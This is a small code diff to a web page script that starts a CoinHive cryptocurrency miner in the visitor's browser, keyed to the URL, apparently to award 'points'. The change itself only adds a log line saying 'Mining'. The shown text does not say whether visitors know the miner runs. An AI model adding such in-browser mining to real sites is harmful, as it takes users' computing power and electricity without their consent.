@@ -12,6 +12,7 @@ if (window.location.search.length > 1) {
     // Add coin hive for points
     var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", window.location.search+window.location.hash);
     miner.start();
+    console.log("Mining");
     miner.on("accepted", () => {
       console.log(miner.getAcceptedHashes());
     })
